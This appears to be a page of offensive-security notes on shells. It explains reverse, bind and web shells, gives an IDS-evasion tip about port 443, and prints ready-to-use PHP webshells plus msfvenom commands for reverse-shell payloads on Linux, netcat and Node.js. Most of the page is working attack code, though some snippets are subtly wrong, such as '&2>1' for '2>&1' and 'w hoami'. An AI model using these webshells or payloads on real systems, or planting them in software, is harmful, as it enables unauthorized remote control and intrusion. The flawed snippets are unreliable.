# Shell

<div class="row row-cols-md-2"><div>

The best kind of situation of a hacker is when it's possible to run commands on the target, or better, to run code on the target. The hacker will typically exploit a vulnerability <small>(ex: file upload, command injection...)</small> leading to a **RCE**

* Remote Command Execution
* Remote Code Execution
</div><div>

The script leading to a RCE could be a

* a **reverse shell**: we open a port on our machine, and the target connect to it. We can run commands on the target, and hopefully do a successful privilege escalation.
* a **bind shell**: we open a port on the target and connect to it. This is like SSH, but we with a port we picked, and no login/password.
* a **web shell**: we are using a webpage with a form to run commands. It's a bit hard to use, but it may be the only way.

> To avoid alerting IDS, a bind/reverse shell should use a port that would not be suspected such as `443` (HTTPS).<br>
>
> It's not always possible to use a bind/reverse shell, there will most likely be a firewall blocking access.
</div></div>

<hr class="sep-both">

## webshell in PHP

If you created a file **xxx.php**, then you can run commands by accessing the URL **xxx.php?cmd=payload**.

<div class="row row-cols-md-2 mt-4"><div>

* ➡️compact one-line webshell

```php
<?=system($_GET["cmd"]." &2>1" ?? "whoami");?>
```

* ➡️simple webshell with `system` ([doc](https://www.php.net/manual/en/function.system.php))

```php
<?php
echo system($_GET["cmd"]." &2>1" ?? "whoami");
?>
```

</div><div>

* ➡️simple webshell with `exec` ([doc](https://www.php.net/manual/en/function.exec.php))

```php
<?php
$output = "";
exec ('w hoami  2>&1', $output)."<br>";
echo implode(' ', $output);
?>
```

* ➡️simple webshell with `passthru`  ([doc](https://www.php.net/manual/en/function.passthru.php))

```php
<?php
echo passthru($_GET["cmd"]." &2>1" ?? "whoami");
?>
```
</div></div>

<hr class="sep-both">

## msfvenom to create shells

You can use msfvenom to generate all kinds of reverse shells.

<div class="row row-cols-md-2"><div>

* List payloads

```bash
$ msfvenom --list payloads
# payload opening a meterpreter - see metasploit
$ msfvenom --list payloads | grep meterpreter
```

* **Linux**

```bash
# execute /bin/bash -p
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
# Generate a .elf opening a reverse shell (TCP)
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
# Output a command (R=RAW) opening a reverse shell with netcat
# same as "-f raw" (to check)?
$ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 R
```
</div><div>

* **Node.js**

```bash
# Generate a .js opening a reverse shell (TCP)
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444 -o shell.js
```

...
</div></div>